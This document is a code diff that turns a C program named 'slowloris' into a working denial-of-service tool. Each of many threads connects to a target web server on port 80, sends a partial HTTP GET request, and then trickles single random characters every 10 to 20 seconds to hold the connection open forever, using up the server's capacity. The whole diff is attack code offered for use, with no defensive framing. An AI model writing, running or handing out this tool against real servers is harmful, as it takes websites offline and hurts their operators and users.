@@ -7,12 +7,14 @@
 #include <arpa/inet.h>
 #include <netdb.h> 
 #include <unistd.h>
+#include <time.h>
 #include <pthread.h>
 
 const char *err_usage = "Usage: ./slowloris <# threads> <target ipv4 addr>";
+const char *get_req = "GET /index.html HTTP/1.1 ";
 
 struct arg_bundle{
-	char *target_addr;
+	char *target_ip;
 	unsigned int target_port;
 	int thread_num;
 };
@@ -21,9 +23,43 @@ struct arg_bundle{
  * Input Functions
  ******************************************************************************/
 
+
+
+ /*******************************************************************************
+ * Util Functions
+ ******************************************************************************/
+
+int gen_rand(int lbound, int ubound){
+	return rand() % (ubound - lbound + 1) + lbound;
+}
+
+char gen_rand8(int lbound, int ubound){
+	return rand() % 128 % (ubound - lbound + 1) + lbound;
+}
+
 /*******************************************************************************
  * Network Functions
  ******************************************************************************/
+
+void init_socket(int *sock_fd, struct sockaddr_in *server, char *ip){
+	//struct hostent *host;
+
+    *sock_fd = socket(AF_INET, SOCK_STREAM, 0);
+    if(*sock_fd < 0){
+        perror("Creating socket");
+        return;
+    }
+
+	/*host = gethostbyname(b->target_ip);
+    if (host == NULL) {
+		perror("Error resolving host");
+		exit(1);
+    }*/
+
+    server->sin_family = AF_INET;
+    server->sin_addr.s_addr = inet_addr(ip);
+    server->sin_port = htons(80);
+}
 
 /*******************************************************************************
  * Thread Functions
@@ -31,42 +67,37 @@ struct arg_bundle{
 
 void *loris(void *_arg){
 	struct arg_bundle *b = (struct arg_bundle*)_arg;
+    struct sockaddr_in server;
 	int sockfd;
-    struct sockaddr_in t_addr;
-	struct hostent *server;
 
-	printf("Thread %i started.\n", b->thread_num);
+	printf("[%i] started.\n", b->thread_num);
 
-	// --- Init connection 
+	init_socket(&sockfd, &server, b->target_ip);
 
-	sockfd = socket(AF_INET, SOCK_STREAM, 0);
-	if(sockfd < 0){
-		perror("Error opening socket");
-		return (void*)NULL;
-	}
-
-	server = gethostbyname(b->target_addr);
-    if (server == NULL) {
-		perror("Error resolving host");
-		return (void*)NULL;
-    }
-
-	memset(&t_addr, '0', sizeof(t_addr));
-	t_addr.sin_family = AF_INET;
-	t_addr.sin_port = htons(b->target_port);
-	bcopy((char *)server->h_addr_list[0], 
-		(char *)&t_addr.sin_addr.s_addr,
-		server->h_length);
-
-	if(connect(sockfd, (struct sockaddr*)&t_addr, sizeof(t_addr)) < 0){
+	if(connect(sockfd, (struct sockaddr*)&server, sizeof(server)) < 0){
 		perror("Error connecting to target");
 		return (void*)NULL;
 	}
 
-	printf("Thread %i initialized.\n", b->thread_num);
+	// Send initial fragment of GET request
+	if(send(sockfd, get_req, strlen(get_req), 0) < 0){
+		perror("Send");
+	}
 
 	while(1){
-		break;
+		char c[2] = {
+			gen_rand(65, 90),
+			'\0',
+		};
+
+		printf("[%i]: sent %s.\n", b->thread_num, c);
+
+		// Send initial fragment of GET request
+		if(send(sockfd, c, strlen(c), 0) < 0){
+			perror("Send");
+		}
+
+		sleep((int)gen_rand(10, 20));
 	}
 
 	close(sockfd);
@@ -82,6 +113,8 @@ int main(int argc, char *argv[]){
 	struct arg_bundle *arg_bundles;
 	unsigned int num_threads;
 	pthread_t *threads;
+
+	srand(time(NULL));
 
 	// --- Validate and parse arguments 
 
@@ -103,7 +136,7 @@ int main(int argc, char *argv[]){
 	// --- Start
 
 	for(int i = 0; i < num_threads; i++){
-		arg_bundles[i].target_addr = argv[2];
+		arg_bundles[i].target_ip = argv[2];
 		arg_bundles[i].target_port = 80;
 		arg_bundles[i].thread_num = i + 1;
 
